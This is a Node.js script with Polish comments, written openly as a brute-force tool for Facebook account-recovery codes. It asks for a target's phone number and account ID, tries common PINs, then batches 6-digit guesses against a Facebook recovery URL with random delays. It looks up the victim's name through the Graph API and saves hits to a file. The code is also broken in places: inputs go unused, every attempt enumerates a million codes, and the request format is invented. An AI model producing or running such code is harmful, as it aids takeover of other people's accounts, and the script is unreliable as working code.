const readlineSync = require('readline-sync');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');

// Definicja słownika kodów
const słownik = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];

// Funkcja do opóźniania działania programu
const delay = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// Funkcja do ataku bruteforce z zastosowaniem sugestii
async function bruteForceCode() {
    const targetInfo = readlineSync.question("Wpisz numer telefonu celu i identyfikator konta oddzielone przecinkiem: ");
    let validCode;

    // Najpierw wypróbuj kody ze słownika
    validCode = await checkBatchValidity(słownik);
    if (validCode) {
        return validCode;
    }

    const maxAttempts = 100;
    const maxDuration = 60 * 1000; // 60 sekund w milisekundach
    const minDelay = 2000; // 2 sekundy w milisekundach
    const maxDelay = 5000; // 5 sekund w milisekundach
    let próby = 0;
    const startTime = Date.now();

    while (true) {
        próby++;

        if (próby > maxAttempts || Date.now() - startTime > maxDuration) {
            break;
        }

        const codes = await bruteForce('0123456789', 6);
        console.log(`Próba ${próby}: Wypróbowane kody: ${codes.join(", ")}`);
        validCode = await checkBatchValidity(codes);
        if (validCode) {
            return validCode;
        }

        console.log(`Próba ${próby}: Żaden z wypróbowanych kodów nie jest prawidłowy.`);

        // Dodaj losowe opóźnienie między próbami
        const randomDelay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await delay(randomDelay);
    }

    return null;
}

// Funkcja do sprawdzania ważności partii kodów
async function checkBatchValidity(codes) {
    const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";
    const requests = codes.map(code => axios.post(targetUrl, { code }));
    const responses = await Promise.all(requests);

    for (let i = 0; i < responses.length; i++) {
        const response = responses[i];
        const code = codes[i];
        if (response.data.valid) {
            const accountInfo = await fetchAccountInfo(); // Pobierz informacje o koncie użytkownika
            if (accountInfo && accountInfo.firstName && accountInfo.lastName) {
                console.log(`Znaleziono prawidłowy kod dla konta użytkownika ${accountInfo.firstName} ${accountInfo.lastName}.`);
                return code;
            } else {
                console.log("Prawidłowy kod został znaleziony, ale konto nie zawiera imienia i nazwiska.");
            }
        }
    }
    return null;
}

// Funkcja do pobierania informacji o koncie użytkownika
async function fetchAccountInfo() {
    try {
        const response = await axios.get("https://graph.facebook.com/me", {
            headers: {
                "Authorization": "Bearer access_token" // Tutaj należy dodać prawidłowy token dostępu do Facebooka
            }
        });
        return response.data;
    } catch (error) {
        console.error("Błąd podczas pobierania informacji o koncie:", error.message);
        return null;
    }
}

// Funkcja do generowania kodów
async function generateCode() {
    const number = crypto.randomInt(100000, 1000000);
    const code = number.toString();
    return code;
}

// Funkcja do ataku bruteforce
async function bruteForce(charset, length) {
    var result = [];
    var charsLength = charset.length;
    for (var i = 0; i < Math.pow(charsLength, length); i++) {
        var s = '';
        var temp = i;
        for (var j = 0; j < length; j++) {
            s = charset[temp % charsLength] + s;
            temp = Math.floor(temp / charsLength);
        }
        result.push(s);
    }
    return result;
}

try {
    bruteForceCode().then(validCode => {
        if (validCode) {
            console.log(`Prawidłowy kod na podanej stronie to: ${validCode}`);
            fs.appendFile("results.txt", `Prawidłowy kod na podanej stronie to: ${validCode}\n`, (err) => {
                if (err) throw err;
            });
        } else {
            console.log("Nie udało się odzyskać kodu.");
        }
    });
} catch (error) {
    console.error(`Błąd: ${error.message}`);
}
